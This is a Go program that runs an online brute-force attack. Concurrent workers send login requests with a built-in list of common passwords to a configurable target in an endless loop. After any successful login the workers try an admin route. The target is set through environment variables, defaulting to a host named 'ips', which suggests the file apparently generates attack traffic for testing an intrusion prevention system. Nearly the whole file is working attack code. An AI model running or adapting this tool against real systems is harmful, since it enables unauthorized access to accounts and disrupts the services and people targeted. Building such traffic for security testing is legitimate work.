package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"
)

// payload struct for login requests
type payload struct {
	Name        string `json:"Name"`
	Description string `json:"Description"`
	Password    string `json:"password"`
	Email       string `json:"Email"`
	Phone       string `json:"Phone"`
	Address     string `json:"Address"`
	City        string `json:"City"`
	State       string `json:"State"`
	Zip         string `json:"Zip"`
}

// getEnv function remains the same
func getEnv(key, defaultVal string) string {
	val := os.Getenv(key)
	if val == "" {
		return defaultVal
	}
	return val
}

// commonPasswords is a list of weak/common passwords to try
var commonPasswords = []string{
	"password", "123456", "admin", "qwerty", "12345678", "123456789",
	"password123", "welcome", "changeme", "secret", "guest", "test",
	"admin123", "root", "toor", "user", "access", "master", "default",
	"superadmin", "pass123", "password!", "password@", "adminadmin",
	"security", "network", "computer", "server", "database", "webadmin",
	"adminpass", "securepass", "mysecret", "111111", "000000", "p@ssw0rd",
}

// worker for Brute Force Attacker
func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, loginPath string, adminUser string, adminRoute string, id int) {
	defer wg.Done()

	loginURL := baseURL + loginPath
	adminURL := baseURL + adminRoute

	fmt.Printf("[worker %d] Starting brute-force attack on %s for user '%s'...\n", id, loginURL, adminUser)

	for { // Loop indefinitely to keep trying passwords
		for _, password := range commonPasswords {
			fmt.Printf("[worker %d] Trying password: %s for user '%s'\n", id, password, adminUser)

			loginPayload := payload{
				Name:        adminUser,
				Description: "Brute-force attempt",
				Password:    password,
				Email:       fmt.Sprintf("%s@example.com", adminUser),
				Phone:       "000-000-0000",
				Address:     "Unknown",
				City:        "Unknown",
				State:       "XX",
				Zip:         "00000",
			}

			bodyBytes, err := json.Marshal(loginPayload)
			if err != nil {
				fmt.Printf("[worker %d] Login payload marshal error: %v\n", id, err)
				time.Sleep(1 * time.Second)
				continue
			}

			req, err := http.NewRequest("POST", loginURL, bytes.NewReader(bodyBytes))
			if err != nil {
				fmt.Printf("[worker %d] Login request creation error: %v\n", id, err)
				time.Sleep(1 * time.Second)
				continue
			}
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "BruteForceAttackerBot/1.0")

			resp, err := client.Do(req)
			if err != nil {
				fmt.Printf("[worker %d] Login request error: %v\n", id, err)
				time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond) // Small random delay on error
				continue
			}
			defer resp.Body.Close()

			respBody, err := io.ReadAll(resp.Body)
			if err != nil {
				fmt.Printf("[worker %d] Failed to read login response body: %v\n", id, err)
				time.Sleep(1 * time.Second)
				continue
			}

			if resp.StatusCode == http.StatusOK {
				fmt.Printf("[worker %d] SUCCESS! Found password '%s' for user '%s'. Status: %d\n", id, password, adminUser, resp.StatusCode)
				// If login is successful, attempt to access the admin route
				fmt.Printf("[worker %d] Attempting to access admin route: %s\n", id, adminURL)

				// In a real scenario, you'd extract the token here if needed for admin access
				// For simplicity, we'll just make a GET request to the admin route.
				// If your admin route requires a bearer token from the successful login,
				// you'd need to parse respBody for the token and include it here.
				adminReq, err := http.NewRequest("GET", adminURL, nil)
				if err != nil {
					fmt.Printf("[worker %d] Admin route request creation error: %v\n", id, err)
					return // Exit worker if cannot create admin request
				}
				adminReq.Header.Set("User-Agent", "BruteForceAttackerBot/1.0 - AdminAccess")

				adminResp, err := client.Do(adminReq)
				if err != nil {
					fmt.Printf("[worker %d] Error accessing admin route %s: %v\n", id, adminURL, err)
				} else {
					defer adminResp.Body.Close()
					fmt.Printf("[worker %d] Accessed admin route %s. Status: %d\n", id, adminURL, adminResp.StatusCode)
					io.Copy(io.Discard, adminResp.Body)
				}
				// After finding the password and attempting admin access, this worker can stop or continue
				// For this attacker, we'll let it continue trying other passwords in case of multiple admin accounts
				// or to keep generating traffic. You could add `return` here to stop.
			} else {
				fmt.Printf("[worker %d] Login failed for '%s' with password '%s'. Status: %d. Response: %s\n", id, adminUser, password, resp.StatusCode, string(respBody))
			}

			// Introduce a small delay between each password attempt
			time.Sleep(time.Duration(rand.Intn(500)+200) * time.Millisecond) // Delay between 200 and 700 ms
		}
		fmt.Printf("[worker %d] Finished trying all common passwords. Restarting...\n", id)
		time.Sleep(5 * time.Second) // Pause before restarting the password list
	}
}

func main() {
	baseURL := getEnv("target_host", "http://ips:8080")
	loginRoute := getEnv("target_login_route", "/login") // Default login route
	adminUser := getEnv("target_admin_user", "admin")    // Default admin username
	adminRoute := getEnv("target_admin_route", "/admin") // Default admin route after successful login
	concurrency := getEnv("concurrency", "5")            // Moderate concurrency for brute force

	numWorkers := 5 // Default concurrency
	fmt.Sscanf(concurrency, "%d", &numWorkers)

	rand.Seed(time.Now().UnixNano()) // Seed the random number generator

	client := &http.Client{
		Timeout: 10 * time.Second, // Increased timeout for potentially slower responses
	}

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(&wg, client, baseURL, loginRoute, adminUser, adminRoute, i)
	}

	wg.Wait()
}
